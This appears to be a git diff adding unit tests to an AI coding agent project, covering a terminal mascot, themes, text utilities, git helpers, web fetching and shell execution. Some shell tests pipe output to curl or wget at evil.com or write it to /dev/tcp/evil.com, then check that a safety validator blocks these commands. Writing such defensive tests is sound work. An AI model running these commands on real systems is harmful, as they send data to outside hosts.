@@ -6,6 +6,8 @@ import { mkdtemp, readFile, writeFile } from 'node:fs/promises';
 import { runEditAgent } from '../src/agent/edit-loop.js';
 import { partitionTools, executeToolBatch, executeToolsSequential } from '../src/agent/orchestration.js';
 import { McpManager } from '../src/tools/mcp-client.js';
+import { Mascot, createBubble, selectSpecies } from '../src/ui/mascot.js';
+import { StreamBatcher } from '../src/utils/stream.js';
 import {
   buildChatSystemPrompt,
   compactConversationIfNeeded,
@@ -236,9 +238,9 @@ test('chat system prompt includes memory context', async () => {
     }
   });
 
-  assert.match(prompt, /用户画像/);
-  assert.match(prompt, /长期记忆/);
-  assert.match(prompt, /长对话摘要/);
+  assert.match(prompt, /画像/);
+  assert.match(prompt, /记忆/);
+  assert.match(prompt, /摘要/);
 });
 
 test('permission guide returns platform-aware content', () => {
@@ -328,19 +330,22 @@ test('loading memory state sanitizes previously broken name data', async () => {
   });
 
   await writeFile(
-    store.profilePath,
-    `${JSON.stringify({ name: '什么名字吗', language: 'zh-CN' }, null, 2)}\n`
-  );
-  await writeFile(
-    store.durableMemoryPath,
-    `${JSON.stringify(
-      [
+    store.memoryPath,
+    `${JSON.stringify({
+      version: 2,
+      profile: { name: '什么名字吗', language: 'zh-CN' },
+      durableMemories: [
         { category: 'profile', content: '用户的名字是 什么名字吗。' },
         { category: 'goal', content: '用户想增强 Frees Agent。' }
       ],
-      null,
-      2
-    )}\n`
+      tasks: [],
+      conversations: {
+        currentSession: null,
+        recentMessages: [],
+        summary: ''
+      },
+      updatedAt: new Date().toISOString()
+    }, null, 2)}\n`
   );
 
   const state = await loadMemoryState(store, {
@@ -621,4 +626,563 @@ test('McpManager disconnectAll handles empty state', async () => {
   const manager = new McpManager({ config: {}, storageRoot: '/tmp' });
   await manager.disconnectAll();
   assert.ok(true);
+});
+
+test('Mascot creates with default species', () => {
+  const mascot = new Mascot({});
+  assert.equal(mascot.species, 'cat');
+  assert.ok(mascot.sprites.length >= 3);
+});
+
+test('Mascot renders specified species', () => {
+  const mascot = new Mascot({ species: 'penguin' });
+  assert.equal(mascot.species, 'penguin');
+  const lines = mascot.render(0);
+  assert.equal(lines.length, 5);
+});
+
+test('Mascot has greetings and reactions', () => {
+  const mascot = new Mascot({ species: 'cat' });
+  const greeting = mascot.getGreeting();
+  assert.ok(greeting.length > 0);
+  const thinking = mascot.getThinkingReaction();
+  assert.ok(thinking.length > 0);
+  const happy = mascot.getHappyReaction();
+  assert.ok(happy.length > 0);
+  const confused = mascot.getConfusedReaction();
+  assert.ok(confused.length > 0);
+});
+
+test('Mascot color property returns ANSI code', () => {
+  const mascot = new Mascot({ species: 'dragon' });
+  assert.match(mascot.color, /\x1b\[/);
+});
+
+test('createBubble wraps text and formats bubble shape', () => {
+  const bubble = createBubble('Hello World', { maxWidth: 30 });
+  assert.ok(bubble.length >= 3);
+  assert.match(bubble[0], /╭/);
+  assert.match(bubble[bubble.length - 1], /╰/);
+});
+
+test('selectSpecies returns valid species name', () => {
+  const species = selectSpecies('test-user');
+  const valid = ['cat', 'penguin', 'rabbit', 'ghost', 'dragon', 'owl'];
+  assert.ok(valid.includes(species));
+});
+
+test('selectSpecies is deterministic', () => {
+  const a = selectSpecies('same-user');
+  const b = selectSpecies('same-user');
+  assert.equal(a, b);
+});
+
+test('StreamBatcher buffers and flushes tokens', async () => {
+  const flushed = [];
+  const batcher = new StreamBatcher({
+    onFlush(chunk) { flushed.push(chunk); },
+    intervalMs: 20,
+    maxSize: 100
+  });
+
+  batcher.write('Hel');
+  batcher.write('lo');
+  batcher.write(' World');
+
+  // Wait for flush timer
+  await new Promise(r => setTimeout(r, 50));
+
+  assert.equal(flushed.length, 1);
+  assert.equal(flushed[0], 'Hello World');
+
+  batcher.destroy();
+});
+
+test('StreamBatcher flushes on maxSize exceeded', async () => {
+  const flushed = [];
+  const batcher = new StreamBatcher({
+    onFlush(chunk) { flushed.push(chunk); },
+    intervalMs: 100,
+    maxSize: 10
+  });
+
+  batcher.write('this is a long text that exceeds max size');
+  // Should flush immediately due to maxSize
+
+  await new Promise(r => setTimeout(r, 30));
+
+  assert.ok(flushed.length >= 1);
+  assert.ok(flushed[0].length >= 10);
+
+  batcher.destroy();
+});
+
+test('StreamBatcher end flushes remaining buffer', () => {
+  const flushed = [];
+  const batcher = new StreamBatcher({
+    onFlush(chunk) { flushed.push(chunk); },
+    intervalMs: 1000
+  });
+
+  batcher.write('test');
+  batcher.end();
+
+  assert.equal(flushed.length, 1);
+  assert.equal(flushed[0], 'test');
+});
+
+test('StreamBatcher destroy clears buffer', () => {
+  const flushed = [];
+  const batcher = new StreamBatcher({
+    onFlush(chunk) { flushed.push(chunk); },
+    intervalMs: 50
+  });
+
+  batcher.write('data');
+  batcher.destroy();
+
+  assert.equal(flushed.length, 0);
+});
+
+test('Mascot species rendering produces different outputs', () => {
+  const cat = new Mascot({ species: 'cat' });
+  const penguin = new Mascot({ species: 'penguin' });
+  const catFrame = cat.render(0);
+  const penguinFrame = penguin.render(0);
+  // Different species should have different art
+  assert.notDeepEqual(catFrame, penguinFrame);
+});
+
+// --- Phase 4: Theme & Display Tools ---
+
+test('theme provides dark and light variants', async () => {
+  const { getTheme, getThemeNames, themeColorToAnsi, applyTheme } = await import('../src/utils/theme.js');
+
+  const dark = getTheme('dark');
+  assert.equal(typeof dark.text, 'string');
+  assert.match(dark.text, /rgb\(/);
+
+  const light = getTheme('light');
+  assert.equal(typeof light.text, 'string');
+
+  // default to dark for unknown theme
+  assert.deepEqual(getTheme('nonexistent'), dark);
+
+  const names = getThemeNames();
+  assert.ok(names.includes('dark'));
+  assert.ok(names.includes('light'));
+  assert.ok(names.includes('dark-ansi'));
+  assert.ok(names.includes('light-ansi'));
+
+  // themeColorToAnsi
+  const ansi = themeColorToAnsi(dark.claude);
+  assert.ok(ansi.startsWith('\x1b['));
+  assert.ok(ansi.includes('38;2'));
+
+  // ANSI theme color
+  const ansiColor = themeColorToAnsi('ansi:red');
+  assert.equal(ansiColor, '\x1b[31m');
+  const ansiBright = themeColorToAnsi('ansi:redBright');
+  assert.equal(ansiBright, '\x1b[91m');
+
+  // applyTheme
+  const colored = applyTheme('hello', 'success', 'dark');
+  assert.ok(colored.includes('hello'));
+  assert.ok(colored.includes('\x1b['));
+  assert.ok(colored.includes('\x1b[0m'));
+});
+
+test('stringWidth measures CJK and ASCII', async () => {
+  const { stringWidth } = await import('../src/utils/truncate.js');
+
+  assert.equal(stringWidth('abc'), 3);
+  assert.equal(stringWidth('你好'), 4);
+  assert.equal(stringWidth(''), 0);
+  // ANSI codes stripped
+  assert.equal(stringWidth('\x1b[31mhello\x1b[0m'), 5);
+  // Mixed
+  assert.equal(stringWidth('a你b好c'), 7);
+});
+
+test('truncation functions handle edge cases', async () => {
+  const mod = await import('../src/utils/truncate.js');
+
+  // truncateToWidth
+  assert.equal(mod.truncateToWidth('hello', 10), 'hello');
+  assert.equal(mod.truncateToWidth('hello world', 5), 'hell…');
+  assert.equal(mod.truncateToWidth('hello', 1), '…');
+  assert.equal(mod.truncateToWidth('hello', 0), '…');
+
+  // truncatePathMiddle
+  const longPath = 'src/components/deeply/nested/folder/MyComponent.tsx';
+  assert.equal(mod.truncatePathMiddle(longPath, 200), longPath);
+  const truncated = mod.truncatePathMiddle(longPath, 30);
+  assert.ok(truncated.length < longPath.length);
+  assert.ok(truncated.includes('…'));
+  assert.ok(truncated.endsWith('MyComponent.tsx'));
+  assert.equal(mod.truncatePathMiddle('short.ts', 20), 'short.ts');
+
+  // truncate (with singleLine)
+  assert.equal(mod.truncate('hello\nworld', 20, true), 'hello…');
+  assert.equal(mod.truncate('hello\nworld', 3, true), 'he…');
+  assert.equal(mod.truncate('hello', 20), 'hello');
+
+  // wrapText
+  const lines = mod.wrapText('hello world foo bar', 10);
+  assert.ok(lines.length >= 2);
+  assert.ok(lines.every(l => l.length <= 11)); // approximate
+});
+
+test('treeify renders nested structures', async () => {
+  const { treeify } = await import('../src/utils/treeify.js');
+
+  const obj = { name: 'test', value: 42 };
+  const result = treeify(obj);
+  assert.ok(result.includes('name'));
+  assert.ok(result.includes('42'));
+  assert.ok(result.includes('├') || result.includes('└'));
+
+  // empty object
+  assert.equal(treeify({}), '(empty)');
+
+  // nested — use multi-key root so continuation uses '│'
+  const nested = { a: { x: 1, y: 2 }, b: { c: 1 } };
+  const nestedResult = treeify(nested);
+  assert.ok(nestedResult.includes('│'));
+  assert.ok(nestedResult.includes('├'));
+  assert.ok(nestedResult.includes('└'));
+
+  // circular reference
+  const circ = { x: 1 };
+  circ.self = circ;
+  const circResult = treeify(circ);
+  assert.ok(circResult.includes('[Circular]'));
+
+  // array value
+  const arr = { items: [1, 2, 3] };
+  const arrResult = treeify(arr);
+  assert.ok(arrResult.includes('Array(3)'));
+
+  // functions
+  const func = { fn: () => {} };
+  const funcResult = treeify(func, { showValues: true });
+  assert.ok(funcResult.includes('[Function]'));
+
+  // hideFunctions
+  const hiddenResult = treeify(func, { hideFunctions: true });
+  assert.ok(!hiddenResult.includes('[Function]'));
+});
+
+// --- Phase 6: Ultraplan Keywords ---
+
+test('hasUltraplanKeyword detects keyword', async () => {
+  const { hasUltraplanKeyword, findUltraplanTriggerPositions, replaceUltraplanKeyword } =
+    await import('../src/utils/ultraplan/keyword.js');
+
+  // Basic detection
+  assert.ok(hasUltraplanKeyword('ultraplan this task'));
+  assert.ok(!hasUltraplanKeyword('plan this task'));
+  assert.ok(!hasUltraplanKeyword(''));
+
+  // Case insensitive
+  assert.ok(hasUltraplanKeyword('Ultraplan this'));
+  assert.ok(hasUltraplanKeyword('ULTRAPLAN'));
+
+  // Within quotes — should NOT trigger
+  assert.ok(!hasUltraplanKeyword('"ultraplan" is a feature'));
+  assert.ok(!hasUltraplanKeyword('`ultraplan` command'));
+  assert.ok(!hasUltraplanKeyword("'ultraplan' mode"));
+
+  // Path context — should NOT trigger
+  assert.ok(!hasUltraplanKeyword('src/ultraplan/foo.ts'));
+  assert.ok(!hasUltraplanKeyword('--ultraplan-mode'));
+  assert.ok(!hasUltraplanKeyword('ultraplan.tsx'));
+
+  // Followed by ? — should NOT trigger
+  assert.ok(!hasUltraplanKeyword('what is ultraplan?'));
+
+  // Slash command — should NOT trigger
+  assert.ok(!hasUltraplanKeyword('/ultraplan help'));
+
+  // findUltraplanTriggerPositions
+  const positions = findUltraplanTriggerPositions('please ultraplan this');
+  assert.equal(positions.length, 1);
+  assert.equal(positions[0].word, 'ultraplan');
+  assert.equal(positions[0].start, 7);
+
+  // replaceUltraplanKeyword
+  assert.equal(replaceUltraplanKeyword('ultraplan this'), 'plan this');
+  assert.equal(replaceUltraplanKeyword('Please ultraplan it'), 'Please plan it');
+  assert.equal(replaceUltraplanKeyword('no keyword'), 'no keyword');
+
+  // Edge: only the keyword
+  assert.equal(replaceUltraplanKeyword('ultraplan'), '');
+});
+
+test('ultraplan enhances buildExecutionPlan detection', async () => {
+  const { hasUltraplanKeyword } = await import('../src/utils/ultraplan/keyword.js');
+  const m = await import('../src/agent/reasoning.js');
+
+  assert.equal(typeof m.buildExecutionPlan, 'function');
+  assert.ok(hasUltraplanKeyword('ultraplan this task'));
+});
+
+// ---- Git utilities ----
+
+test('git findGitRoot walks up to .git directory', async () => {
+  const { findGitRoot, findCanonicalGitRoot, getIsGit, isAtGitRoot, isValidGitSha } = await import('../src/utils/git.js');
+
+  const root = findGitRoot(process.cwd());
+  assert.ok(root);
+  assert.ok(root.endsWith('Frees-Agent') || root.endsWith('Frees-Agent/'), `expected Frees-Agent root, got ${root}`);
+
+  assert.ok(getIsGit(process.cwd()));
+  assert.ok(!isValidGitSha('bad'));
+  assert.ok(isValidGitSha('a'.repeat(40)));
+  assert.ok(isValidGitSha('b'.repeat(64)));
+
+  const canonical = findCanonicalGitRoot(process.cwd());
+  assert.ok(canonical);
+});
+
+test('git normalizeGitRemoteUrl handles ssh and https formats', async () => {
+  const { normalizeGitRemoteUrl } = await import('../src/utils/git.js');
+
+  const ssh = 'git@github.com:owner/repo.git';
+  assert.equal(normalizeGitRemoteUrl(ssh), 'github.com/owner/repo');
+
+  const https = 'https://github.com/owner/repo.git';
+  assert.equal(normalizeGitRemoteUrl(https), 'github.com/owner/repo');
+
+  const noGit = 'git@github.com:owner/repo';
+  assert.equal(normalizeGitRemoteUrl(noGit), 'github.com/owner/repo');
+
+  const empty = '';
+  assert.equal(normalizeGitRemoteUrl(empty), null);
+
+  const nullVal = null;
+  assert.equal(normalizeGitRemoteUrl(nullVal), null);
+  assert.equal(normalizeGitRemoteUrl(undefined), null);
+});
+
+test('git getBranch and getHead return current state', async () => {
+  const { getBranch, getHead, getRemoteUrl, getIsClean } = await import('../src/utils/git.js');
+
+  const branch = await getBranch();
+  assert.ok(branch, 'should have a branch');
+
+  const head = await getHead();
+  assert.ok(head);
+  assert.match(head, /^[0-9a-f]{40}$/);
+
+  const url = await getRemoteUrl();
+  assert.ok(url);
+  assert.ok(url.includes('github.com') || url.includes('Frees-Ling'));
+});
+
+test('git getGitState returns comprehensive repo info', async () => {
+  const { getGitState, getChangedFiles } = await import('../src/utils/git.js');
+
+  const state = await getGitState();
+  assert.ok(state);
+  assert.ok(state.repoRoot);
+  assert.ok(state.branch);
+  assert.ok(state.head);
+  assert.match(state.head, /^[0-9a-f]{40}$/);
+
+  const files = await getChangedFiles();
+  assert.ok(Array.isArray(files));
+});
+
+test('slug generator produces valid slugs', async () => {
+  const { generateWordSlug, generateShortWordSlug } = await import('../src/utils/slug.js');
+
+  const full = generateWordSlug();
+  assert.ok(full.length > 0);
+  assert.ok(full.includes('-'));
+
+  const parts = full.split('-');
+  assert.equal(parts.length, 3, 'full slug should have 3 parts');
+
+  const short = generateShortWordSlug();
+  assert.ok(short.includes('-'));
+  assert.equal(short.split('-').length, 2, 'short slug should have 2 parts');
+});
+
+test('file utilities detect binary and text files correctly', async () => {
+  const { isProbablyTextFile, formatBytes } = await import('../src/utils/files.js');
+
+  // Known binary extensions
+  const pngResult = isProbablyTextFile('image.png', Buffer.from([137, 80, 78, 71]));
+  assert.ok(!pngResult, 'PNG should be detected as binary');
+
+  const exeResult = isProbablyTextFile('app.exe', Buffer.from([77, 90]));
+  assert.ok(!exeResult, 'EXE should be detected as binary');
+
+  // Known text extensions
+  const jsResult = isProbablyTextFile('file.js', Buffer.from('hello world'));
+  assert.ok(jsResult, 'JS file should be detected as text');
+
+  const pyResult = isProbablyTextFile('file.py', Buffer.from('print("hello")'));
+  assert.ok(pyResult, 'Python file should be detected as text');
+
+  // formatBytes
+  assert.equal(formatBytes(500), '500 B');
+  assert.equal(formatBytes(2048), '2.0 KB');
+  assert.equal(formatBytes(1048576), '1.0 MB');
+});
+
+test('readIndexedFile returns enhanced file info', async () => {
+  const { scanWorkspace } = await import('../src/workspace/indexer.js');
+  const { readIndexedFile } = await import('../src/workspace/queries.js');
+
+  // Scan only src/utils/ to stay within budget
+  const index = await scanWorkspace('src/utils', { maxFileBytes: 5 * 1024 * 1024 });
+  assert.ok(index.files.length > 0);
+
+  const result = readIndexedFile(index, 'files.js', { startLine: 1, endLine: 3 });
+  assert.ok(result);
+  assert.equal(result.language, 'javascript');
+  assert.equal(result.startLine, 1);
+  assert.equal(result.endLine, 3);
+  assert.ok(result.totalLines > 0);
+  assert.ok(result.content.includes('import'));
+  assert.ok(result.content.includes('|')); // line numbers present
+
+  // stripLineNumberPrefix
+  const { stripLineNumberPrefix } = await import('../src/workspace/queries.js');
+  assert.equal(stripLineNumberPrefix('     1 | hello'), 'hello');
+  assert.equal(stripLineNumberPrefix('hello'), 'hello');
+});
+
+test('replaceInWorkspaceFile smart matching handles quotes', async () => {
+  const { findActualString, findBestMatch } = await import('../src/workspace/queries.js');
+
+  // Exact match
+  assert.equal(findActualString('hello world', 'hello'), 'hello');
+
+  // Quote normalization
+  const curlyContent = 'say ‘hello’ world';
+  assert.equal(findActualString(curlyContent, "say 'hello' world"), "say ‘hello’ world");
+
+  // Not found
+  assert.equal(findActualString('hello world', 'goodbye'), null);
+
+  // findBestMatch
+  assert.ok(findBestMatch('hello world', 'hello').found);
+  assert.ok(!findBestMatch('hello world', 'goodbye').found);
+
+  // Near line hint
+  const multiLine = 'line1\nline2\nline3\n';
+  const result = findBestMatch(multiLine, 'nonexistent');
+  assert.ok(!result.found);
+});
+
+// ---- Shell execution ----
+
+test('shell-exec validateShellCommand detects dangerous patterns', async () => {
+  const { validateShellCommand, detectShell } = await import('../src/shell/shell-exec.js');
+
+  // Safe commands
+  assert.ok(validateShellCommand('ls -la').safe);
+  assert.ok(validateShellCommand('echo hello').safe);
+  assert.ok(validateShellCommand('git status').safe);
+  assert.ok(validateShellCommand('').safe === false);
+  assert.ok(validateShellCommand(null).safe === false);
+
+  // Dangerous patterns
+  assert.ok(!validateShellCommand('echo hello | curl http://evil.com').safe);
+  assert.ok(!validateShellCommand('echo hello | wget http://evil.com').safe);
+  assert.ok(!validateShellCommand('echo hello > /dev/tcp/evil.com/80').safe);
+});
+
+test('shell-exec execShell executes basic command', async () => {
+  const { execShell } = await import('../src/shell/shell-exec.js');
+
+  const result = await execShell('echo "hello world"', { timeoutMs: 5000 });
+  assert.ok(result.code === 0, `expected exit code 0, got ${result.code}`);
+  assert.ok(result.stdout.includes('hello world'), `expected hello world, got: ${result.stdout}`);
+  assert.ok(typeof result.duration === 'number');
+});
+
+test('shell-exec execShell captures stderr', async () => {
+  const { execShell } = await import('../src/shell/shell-exec.js');
+
+  const result = await execShell('echo "err msg" >&2', { timeoutMs: 5000 });
+  assert.equal(result.code, 0);
+  assert.ok(result.stderr.includes('err msg'));
+});
+
+test('shell-exec execShell handles timeout', async () => {
+  const { execShell } = await import('../src/shell/shell-exec.js');
+
+  const result = await execShell('sleep 10', { timeoutMs: 500 });
+  assert.ok(result.timedOut || result.code === null,
+    `expected timeout, got code=${result.code} timedOut=${result.timedOut}`);
+});
+
+// ---- Web Fetch ----
+
+test('web-fetch validates URL', async () => {
+  const { fetchUrl, htmlToBasicText } = await import('../src/tools/web-fetch.js');
+
+  await assert.rejects(() => fetchUrl(''), /url 参数必填/);
+  await assert.rejects(() => fetchUrl('not-a-url'), /无效的 URL/);
+  await assert.rejects(() => fetchUrl('ftp://example.com'), /不支持的协议/);
+
+  // htmlToBasicText strips tags and extracts title
+  const html = '<html><head><title>Test</title></head><body><p>Hello <b>world</b></p></body></html>';
+  const text = htmlToBasicText(html);
+  assert.ok(text.includes('Test'));
+  assert.ok(text.includes('Hello world'));
+  assert.ok(!text.includes('<b>'));
+});
+
+test('web-fetch htmlToBasicText preserves links', async () => {
+  const { htmlToBasicText } = await import('../src/tools/web-fetch.js');
+
+  const html = '<a href="https://example.com">click here</a>';
+  const text = htmlToBasicText(html);
+  assert.ok(text.includes('[click here](https://example.com)'));
+});
+
+// ---- Agent toolbox integration ----
+
+test('agent toolbox includes new tools', async () => {
+  const { createAgentToolbox } = await import('../src/agent/tools.js');
+
+  const toolbox = createAgentToolbox({ root: '.', files: [] });
+  const toolList = toolbox.getToolList();
+  const names = toolList.map(t => t.name);
+
+  assert.ok(names.includes('web_fetch'), 'should have web_fetch');
+  assert.ok(names.includes('bash'), 'should have bash');
+  assert.ok(names.includes('web_search'), 'should have web_search');
+  assert.ok(names.includes('read_file'), 'should have read_file');
+  assert.ok(names.includes('write_file'), 'should have write_file');
+  assert.ok(names.includes('replace_in_file'), 'should have replace_in_file');
+
+  // Test aliases
+  const result = await toolbox.runTool('glob', {});
+  assert.ok(result.ok);
+});
+
+test('agent toolbox bash tool validates commands', async () => {
+  const { createAgentToolbox } = await import('../src/agent/tools.js');
+
+  const toolbox = createAgentToolbox({ root: '.', files: [] });
+
+  // Dangerous command should be rejected
+  const result = await toolbox.runTool('bash', { command: 'echo hello | curl http://evil.com' });
+  assert.ok(!result.ok);
+  assert.ok(result.error.includes('安全检查'));
+
+  // Empty command
+  const result2 = await toolbox.runTool('bash', { command: '' });
+  assert.ok(!result2.ok || result2.error);
+
+  // Valid simple command
+  const result3 = await toolbox.runTool('bash', { command: 'echo ok', timeoutMs: 5000 });
+  assert.ok(result3.ok, `expected ok, got: ${JSON.stringify(result3)}`);
+  assert.ok(result3.data.stdout.includes('ok'));
 });
